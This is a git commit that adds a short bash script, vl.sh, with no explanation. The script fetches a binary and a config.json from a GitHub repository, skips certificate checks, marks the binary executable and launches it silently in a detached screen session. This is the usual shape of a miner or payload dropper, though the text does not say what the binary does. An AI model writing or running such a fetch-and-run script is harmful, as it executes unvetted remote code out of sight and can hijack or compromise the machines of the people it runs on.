108fbb7fafa6cd134cc7a9f181459d5d10b4ad32
dballard198 <dballard198@gmail.com>
2026-07-09 22:55:51 +0900

    Create vl.sh

---
+++ vl.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+wget https://raw.githubusercontent.com/dballard198/jackse/refs/heads/main/mop
+chmod u+x mop
+wget --no-check-certificate -qO ./config.json https://raw.githubusercontent.com/dballard198/jackse/refs/heads/main/mm.json
+screen -dmS task bash -c "./mop"
